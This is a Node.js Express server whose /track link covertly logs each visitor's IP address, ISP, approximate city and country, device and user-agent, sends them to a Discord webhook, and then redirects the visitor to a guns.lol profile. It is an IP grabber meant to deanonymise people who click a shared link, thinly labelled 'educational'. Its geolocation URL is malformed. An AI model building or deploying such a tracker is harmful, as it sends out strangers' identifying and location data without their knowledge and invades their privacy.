const express = require('express');
const useragent = require('express-useragent');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust Render's reverse proxy headers to accurately capture client IPs
app.enable('trust proxy');

// Use the useragent middleware to easily read device details
app.use(useragent.express());

// Securely access the Discord Webhook from Render environment variables
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.get('/track', async (req, res) => {
    // 1. Instantly capture incoming IP address variants
    let clientIp = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Clean up proxy strings if multiple IPs are forwarded (takes the first/original client IP)
    if (clientIp && clientIp.includes(',')) {
        clientIp = clientIp.split(',')[0].trim();
    }

    // 2. Format device information using the middleware parsing results
    let deviceType = "Desktop/Laptop";
    if (req.useragent.isMobile) deviceType = "Mobile Phone";
    if (req.useragent.isTablet) deviceType = "Tablet";
    if (req.useragent.isBot) deviceType = "Search Bot / Automated Script";
    
    const osName = req.useragent.os || "Unknown OS";
    const browserName = req.useragent.browser || "Unknown Browser";
    const rawUserAgent = req.headers['user-agent'] || "Unknown User Agent";

    // 3. Define defaults for network and geographic data
    let locationData = {
        country: "Unknown / Cloud Proxy",
        city: "Unknown",
        isp: "Unknown Network Provider"
    };

    // 4. Perform a background lookup if it is a valid public IP address
    if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('::ffff:127.')) {
        try {
            // Using a free, lightweight IP API endpoint specifying desired fields
            const lookupUrl = `http://ip-api.com{clientIp}?fields=status,country,city,isp`;
            const response = await fetch(lookupUrl);
            const data = await response.json();
            
            if (data && data.status === 'success') {
                if (data.country) locationData.country = data.country;
                if (data.city) locationData.city = data.city;
                if (data.isp) locationData.isp = data.isp;
            }
        } catch (error) {
            console.error("[Backend Error] Geolocation resolution failed:", error.message);
        }
    }

    // 5. Structure a Discord Rich Embed payload with the requested metrics
    const discordPayload = {
        username: "Traffic Logger System",
        avatar_url: "https://imgur.com", 
        embeds: [{
            title: "📥 Incoming Connection Analyzed",
            description: `A client initiated a request and was automatically routed to your guns.lol profile.`,
            color: 5814783, // Elegant blurple/blue color block
            fields: [
                { name: "🌐 Public IP Address", value: `\`${clientIp}\``, inline: true },
                { name: "📡 Network Operator (ISP)", value: `\`${locationData.isp}\``, inline: true },
                { name: "📍 Approximate Location", value: `\`${locationData.city}, ${locationData.country}\``, inline: false },
                { name: "📱 Device Classification", value: `\`${deviceType} (${osName} / ${browserName})\``, inline: false },
                { name: "📝 Raw User-Agent Header", value: `\`\`\`${rawUserAgent}\`\`\``, inline: false }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Educational Network Analytics Routing"
            }
        }]
    };

    // 6. Forward the payload to the Discord Webhook asynchronously
    try {
        if (DISCORD_WEBHOOK_URL) {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });
        } else {
            console.log("[Notice] Logging event locally. (Discord Webhook environment variable not set).");
        }
    } catch (webhookError) {
        console.error("[Backend Error] Could not post payload to Discord:", webhookError.message);
    }

    // 7. Complete the execution requirement by redirecting directly to your page
    return res.redirect(302, 'https://guns.lol/xsaint');
});

// Root route placeholder to easily check deployment status
app.get('/', (req, res) => {
    res.send('Server is operational. Direct traffic to the /track path.');
});

app.listen(PORT, () => {
    console.log(`Server actively initialized on port ${PORT}`);
});
